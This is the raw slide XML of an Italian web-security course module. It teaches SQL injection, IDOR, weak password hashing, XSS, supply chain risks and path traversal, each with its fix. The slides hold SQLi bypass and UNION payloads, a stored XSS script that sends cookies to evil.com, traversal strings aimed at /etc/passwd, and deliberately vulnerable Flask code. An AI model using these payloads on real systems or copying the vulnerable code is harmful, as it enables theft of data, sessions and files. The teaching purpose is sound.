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M6 — Sicurezza delle Applicazioni Web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M6 — Sicurezza Applicazioni Web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 ore — 3h teoria + 6h lab (cuore del corso)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OWASP Top 10:2025</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>CVE/CVSS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>Le 5 vulnerabilità web più diffuse:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" indent="-342900" marL="685800">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>SQL Injection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" indent="-342900" marL="685800">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>IDOR</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" indent="-342900" marL="685800">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>Crypto Failures</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" indent="-342900" marL="685800">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>XSS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" indent="-342900" marL="685800">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>Path Traversal</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>Supply Chain (pip-audit)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Mappa del modulo (9h)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Argomento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OWASP + CVE/CVSS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 Injection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1,5h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IDOR / Broken Access Control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1,5h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 &amp; crittografia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1,5h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0,5h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 Chain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 Traversal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OWASP — chi sono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Open Web Application Security Project</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>No-profit fondata 2001</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>Top 10 aggiornata ogni ~3 anni</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>Tool gratuiti (ZAP, Dependency-Check, ASVS)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OWASP Top 10:2021 (riferimento)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A01 Broken Access Control A02 Cryptographic Failures A03 Injection A04 Insecure Design A05 Security Misconfiguration A06 Vulnerable Components A07 Auth Failures A08 Software &amp; Data Integrity A09 Logging &amp; Monitoring A10 SSRF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CVE — Common Vulnerabilities and Exposures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Identificatore univoco: </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>CVE-AAAA-NNNNN</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>Database: NVD (nvd.nist.gov)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>Esempi celebri: CVE-2014-0160 (Heartbleed), CVE-2021-44228 (Log4Shell)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CVSS 3.1 — bande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0.1–3.9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4.0–6.9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7.0–8.9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9.0–10.0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Critical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CVSS — Vector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CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>AV (Attack Vector): N=Network</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>AC (Complexity): L=Low</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>PR (Privileges): N=None</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>UI (Interaction): N=None</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>S (Scope): C=Changed</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>C/I/A: H=High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/>
              <a:t>10.0 Critical</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> (es. Log4Shell)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SQL Injection (M6.2)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VULNERABILE</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>sql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f"SELECT * FROM users WHERE id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user_id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cursor.execute(sql)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>L’attaccante invia </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>user_id = 1 OR 1=1</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> → query diventa </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>SELECT * FROM users WHERE id = 1 OR 1=1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Login bypass classico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email: </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="4070A0"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>' OR '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4070A0"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>'='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password</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>: qualunque</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>Query risultante: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users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email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''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'1'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'1'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password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'qualunque'</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>→ Login senza conoscere la password.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UNION-based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' UNION SELECT username, password, NULL FROM users --</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>→ Estrai TUTTI gli username/password da una colonna ignara.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— query parametrizzate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 SICURO</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>cursor.execute(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"SELECT * FROM users WHERE id = ?"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(user_id,)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✅ ORM (preferito)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>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User.query.filter_by(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user_id).first()</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="0" marL="1270000">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000"/>
              <a:t>Il driver tratta il </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000">
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>?</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000"/>
              <a:t> come </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="1"/>
              <a:t>dato</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000"/>
              <a:t>, non struttura. Mai più SQLi.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 comune — filtrare gli apici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NON BASTA</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>email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email.replace(</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="4070A0"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>"'"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L’attaccante usa encoding, commenti, </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>\'</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> → bypass. </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1"/>
              <a:t>Solo le query parametrizzate sono robuste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Difese stratificate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Query parametrizzate (sempre)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>✅ ORM</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>✅ Least privilege per l’utente DB</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>✅ Errori generici al client</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>✅ WAF</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>✅ Logging pattern sospetti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Broken Access Control / IDOR (M6.3)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 vs Authz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Authorization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Domanda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“Chi sei?”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“Cosa puoi fare?”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Ogni request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Esempio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email+pwd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user.id == fattura.owner_id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IDOR — esempio classico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Manca controllo proprietario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@app.route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"/fattura/&lt;int:fid&gt;"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fattura(fid):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>   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Fattura.query.get(fid)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render_template(</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="4070A0"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>"fattura.html"</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>, fattura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f)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>Attacco: cambia URL </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>/fattura/42</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> → </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>/fattura/43</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> → vedo fatture altrui.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IDOR su PUT/DELETE — peggio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PUT /fattura/43</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> → modifico quella di un altro</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>DELETE /fattura/43</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> → cancello quella di un altro</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>POST /fattura {owner_id: 43}</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> → creo a nome di un altro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— ownership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✅ Filter by owner direttamente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@app.route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"/fattura/&lt;int:fid&gt;"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@login_required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fattura(fid):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>   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Fattura.query.filter_by(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fid,</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>        owner_id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session[</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="4070A0"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>"user_id"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).first_or_404()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render_template(</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="4070A0"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>"fattura.html"</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>, fattura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f)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 code: 401 vs 403 vs 404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401</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> → non autenticato (manca login)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr b="1"/>
              <a:t>403</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> → autenticato ma non autorizzato</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr b="1"/>
              <a:t>404</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> → la risorsa non esiste</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="0" marL="1270000">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000"/>
              <a:t>Per IDOR: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="1"/>
              <a:t>403</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000"/>
              <a:t> (non 404 — confonderebbe info).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 comune — security by obscurity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“Nascondo gli ID nell’UI, l’attaccante non li conosce.”</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>L’attaccante li trova lo stesso (DevTools, log, brute force). La difesa è </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1"/>
              <a:t>server-side</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t>, sempre.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Cryptographic Failures (M6.4)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Encoding ≠ Hashing ≠ Encryption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Reversibile?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Encoding</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr/>
                        <a:t> (Base64)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 (banale)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Trasporto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Encryption</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr/>
                        <a:t> (AES)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 (con chiave)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Confidenzialità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Hashing</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr/>
                        <a:t> (bcrypt)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Base64 </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="1"/>
              <a:t>non è cifratura</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000"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Perché MD5/SHA-1/SHA-256 NON vanno per password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MD5/SHA-1: </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1"/>
              <a:t>collisioni note</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1"/>
              <a:t>veloci</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> su GPU</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>SHA-256: troppo veloce (miliardi/sec su hardware moderno)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>Senza salt: </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1"/>
              <a:t>rainbow table</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> banali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bcrypt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bcrypt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Hash</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>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bcrypt.hashpw(pwd.encode(), bcrypt.gensalt(rounds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Verify</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>ok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bcrypt.checkpw(pwd.encode(), h)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>Work factor configurabile (12 ≈ 250ms)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>Salt automatico</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>Standard de facto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Argon2id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argon2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PasswordHasher</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>ph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PasswordHasher()</a:t>
            </a:r>
            <a:br/>
            <a:br/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>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ph.</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>hash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"segreta"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ph.verify(h, </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="4070A0"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>"segreta"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raise se sbagliata</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>Più moderno (vincitore PHC 2015)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>Resistenza GPU + ASIC</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>Da preferire per nuove app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Diagnosi visiva nel DB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vedi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Diagnosi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mariopwd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🔥 In chiaro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5f4dcc3b...</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr/>
                        <a:t> (32 hex)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MD5 (morto)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5baa61e4...</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr/>
                        <a:t> (40 hex)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SHA-1 (morto)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e3b0c44...</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr/>
                        <a:t> (64 hex)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SHA-256 senza salt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$2b$12$...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bcrypt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$argon2id$...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Argon2id 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Cross-Site Scripting (M6.5)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3 tipi di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Reflected</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t>: payload nell’URL, riflesso nella pagina</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr b="1"/>
              <a:t>Stored</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t>: payload salvato nel DB, mostrato a chi visita</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr b="1"/>
              <a:t>DOM-based</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t>: manipolazione client-side via JS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Esempio Stored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Template Jinja2 con |safe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{{ commento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safe }}</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="666666"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>&lt;/</a:t>
            </a:r>
            <a:r>
              <a:rPr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/>
              <a:t>Attaccante posta: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script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fetch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'https://evil.com/log?c='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008000"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>document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cookie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script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/>
              <a:t>→ ogni visitatore della pagina </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1"/>
              <a:t>invia il proprio cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> all’attaccante.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— escape dell’output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Jinja2 fa escape </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1"/>
              <a:t>di default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&lt;!-- ✅ SICURO (default) --&gt;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p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{{ commento }}</a:t>
            </a:r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p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🚩 PERICOLOSO --&gt;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p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{{ commento | safe }}</a:t>
            </a:r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p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</a:p>
          <a:p>
            <a:pPr lvl="0" indent="0" marL="1270000">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000"/>
              <a:t>Non disabilitare </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000">
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>escape</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000"/>
              <a:t> su input utente. Mai.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CSP — la difesa stratificata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Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-r4nd0m'</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>Anche con XSS payload, browser non esegue</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>Difesa </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1"/>
              <a:t>complementare</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> (non sostitutiva) all’escape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Cookie HttpOnly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Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Lax</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>Anche se XSS riesce, non può rubare il cookie di sessione.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Difese stratificate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Escape output (Jinja2 default)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>✅ CSP restrittiva</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>✅ Cookie HttpOnly</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>✅ Sanitizzazione input (per input HTML voluto: </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>bleach</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>✅ X-Content-Type-Options: nosniff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Supply Chain (M6.6)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superficie di attacco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CVE in dipendenze</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> (caso più comune)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr b="1"/>
              <a:t>Typosquatting</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>reqeusts</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> invece di </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>requests</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr b="1"/>
              <a:t>Dependency confusion</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> (npm interno vs pubblico)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr b="1"/>
              <a:t>Compromise build pipeline</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> (SolarWinds)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pip-audit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 install pip-audit</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>pip-audit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</a:p>
          <a:p>
            <a:pPr lvl="0" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>Output:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>Found 3 known vulnerabilities in 2 packages
flask    2.0.0    GHSA-m2qf-... → 2.2.5
pyyaml   5.1      GHSA-6757-... → 5.4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XZ Utils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CVE-2024-3094, CVSS 10.0</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>Backdoor inserita da un manutentore “ostile”</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>Scoperta per caso prima dello scollamento massivo</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr b="1"/>
              <a:t>Lezione</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t>: sicurezza supply chain è il rischio più crescente del 2020s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Software Bill of Materials — lista completa di tutte le dipendenze del prodotto</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>Formati: CycloneDX, SPDX</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>Sarà obbligatorio per </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1"/>
              <a:t>CRA dal 2027</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t>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Path Traversal (M6.7)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🚩 Vulnerabile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@app.route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"/download"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download():</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>    filename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request.args.get(</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="4070A0"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>"file"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send_file(</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="BB6688"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>f"./uploads/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filename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Attacco: </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>?file=../../etc/passwd</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> → leggo file fuori dalla cartella.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Bypass tipici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../etc/passwd
....//....//etc/passwd        # bypass filtro ../
..%2f..%2fetc%2fpasswd          # URL-encoded
..\\Windows\\System32\\drivers\\etc\\hosts   # Windows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Difesa — 3 controlli obbligatori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os</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>UPLOAD_DIR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os.path.realpath(</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="4070A0"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>"./uploads"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ALLOWED_EXTS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".pdf"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".jpg"</a:t>
            </a:r>
            <a:r>
              <a:rPr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1) Whitelist nome (no separatori)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fn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"\\"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fn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fn.startswith(</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="4070A0"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>"."</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>): abort(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2) Whitelist estensione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os.path.splitext(fn)[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].lower()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ALLOWED_EXTS: abort(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3) realpath + startswith</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>full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os.path.realpath(os.path.join(UPLOAD_DIR, fn))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full.startswith(UPLOAD_DIR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os.sep): abort(</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="40A070"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>403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Mapping OWASP ↔ CWE ↔ GDPR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OWASP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Sanzione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A01 IDOR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A02 Crypto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327, 916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32(1)(a)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A03 SQLi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A03 XSS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A06 Components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 Traversal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M6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Riconosci SQLi nel codice</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>☐ Sai sfruttarla con </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>' OR '1'='1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>☐ Sai correggerla con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☐ Riconosci IDOR (URL con ID)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>☐ Aggiungi ownership check</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>☐ Migri SHA-1 → bcrypt</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>☐ Riconosci 3 tipi di XSS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>☐ Esegui pip-audit</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>☐ Difendi /download da </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>../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Errori da evitare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❌ “Filtro gli apici, sono al sicuro da SQLi”</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
